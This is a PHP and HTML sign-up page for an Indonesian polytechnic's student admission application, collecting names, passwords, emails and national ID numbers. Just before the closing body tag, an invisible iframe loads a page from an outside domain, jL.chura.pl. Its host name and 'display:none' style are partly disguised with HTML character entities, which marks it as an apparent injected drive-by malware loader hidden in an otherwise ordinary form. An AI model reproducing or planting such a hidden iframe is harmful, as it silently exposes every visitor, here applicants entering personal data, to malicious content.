
 <?php
ini_set("display_errors",0);
// Definisi database
include("includes/defines.php");
// Kumpulan fungsi
include("includes/fungsi.php");
// Koneksi ke database
include("includes/connect.php");
// Membuat session login

?>

<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from ableproadmin.com/light/vertical/login1.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 Apr 2017 21:50:51 GMT -->
<head>
    <title>SELAMAT DATANG</title>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->


    <!-- Meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="description" content="Phoenixcoded">
    <meta name="keywords"
          content=", Responsive, Landing, Bootstrap, App, Template, Mobile, iOS, Android, apple, creative app">
    <meta name="author" content="Phoenixcoded">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="as2/images/favicon.png" type="image/x-icon">
    <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">

    <!-- Google font-->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">

    <!-- Font Awesome -->
    <link href="as2/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!--ico Fonts-->
    <link rel="stylesheet" type="text/css" href="as2/icon/icofont/css/icofont.css">

    <!-- Required Fremwork -->
    <link rel="stylesheet" type="text/css" href="as2/css/bootstrap.min.css">

    <!-- waves css -->
    <link rel="stylesheet" type="text/css" href="as2/plugins/waves/css/waves.min.css">

    <!-- Style.css -->
    <link rel="stylesheet" type="text/css" href="as2/css/main.css">

    <!-- Responsive.css-->
    <link rel="stylesheet" type="text/css" href="as2/css/responsive.css">

    <!--color css-->
    <link rel="stylesheet" type="text/css" href="as2/css/color/color-1.css" id="color"/>

</head>
<body>
<section class="login p-fixed d-flex text-center bg-primary common-img-bg">
    <!-- Container-fluid starts -->
    <div class="container-fluid">
        <div class="row">

            <div class="col-sm-12">
                <div class="login-card card-block">
                    <form class="md-float-material" action="daftar.php" method="post">
                    <input type="hidden" class="md-form-control" name="id_user"  required="">
                        <div class="text-center">
                            
                        </div>-->
                        <h3 class="text-center txt-primary">
                            APLIKASI PENDAFTARAN MAHASISWA BARU JALUR MANDIRI (APMBJM)
                        </h3>
                         <?php
                                 
                                    $cek = mysql_query("SELECT no_registrasi FROM tformulirpendaftaran");
                                    $cek1 = mysql_num_rows($cek);
                                         
                                        $a = $cek1+1; 
                                        $c = 'POLITEKNIK';
                                        $d = date('Y');
                                        $noreg = $a.'/'.$c.'/'.$d;
                                           
                                ?>
                                <input type="hidden" class="md-form-control" name="no_registrasi" value="<?php echo $noreg; ?>" required="">
                        <div class="md-input-wrapper">
                            <input type="text" class="md-form-control" name="nama_mahasiswa" required="" />
                            <label>Nama Lengkap</label>
                        </div>
                        <div class="row">
                                        <div class="col-sm-6">
                                                <div class="md-input-wrapper">
                                                    <input type="text" class="md-form-control" name="username" required="">
                                                    <label>Username</label>
                                                </div>
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="md-input-wrapper">
                                                    <input type="password" class="md-form-control" name="password" required="">
                                                    <label>Password</label>
                                                </div>
                                        </div>
                                    </div>
                                    <div class="md-input-wrapper">
                            <input type="email" class="md-form-control" name="email" required="" />
                            <label>Email</label>
                        </div>
                      <div class="md-input-wrapper">
                            <input type="number" class="md-form-control" name="nik" required="" />
                            <label>NIK</label>
                        </div>
                        <div class="md-input-wrapper">
                            <input type="number" class="md-form-control" name="nisn" required="" />
                            <label>NISN</label>
                        </div>

                        <div class="row">
                            <div class="col-xs-10 offset-xs-1">
                                <button type="submit" class="btn btn-primary btn-md btn-block waves-effect text-center m-b-20" >DAFTAR</button>
                            </div>
                        </div>
                        <div class="col-sm-12 col-xs-12 text-center">
                            <span class="text-muted">Sudah terdaftar sebagai member?</span>
                            <a href="login.php" class="f-w-600 p-l-5">Masuk Disini</a>
                        </div>
                        <!-- <div class="card-footer"> -->
                      

                        <!-- </div> -->
                    </form>
                    <!-- end of form -->
                </div>
                <!-- end of login-card -->
            </div>
            <!-- end of col-sm-12 -->
        </div>
        <!-- end of row -->
    </div>
    <!-- end of container-fluid -->
</section>


<!-- Warning Section Ends -->
<!-- Required Jqurey -->
<script src="as2/js/jquery-3.1.1.min.js"></script>
<script src="as2/js/jquery-ui.min.js"></script>
<!-- tether.js -->
<script src="as2/js/tether.min.js"></script>
<!-- waves effects.js -->
<script src="as2/plugins/waves/js/waves.min.js"></script>
<!-- Required Framework -->
<script src="as2/js/bootstrap.min.js"></script>
<!-- Custom js -->
<script type="text/javascript" src="as2/pages/elements.js"></script>
<script type="text/javascript" src="as2/js/common-pages.js"></script>


<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>

<!-- Mirrored from ableproadmin.com/light/vertical/login1.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 Apr 2017 21:50:51 GMT -->
</html>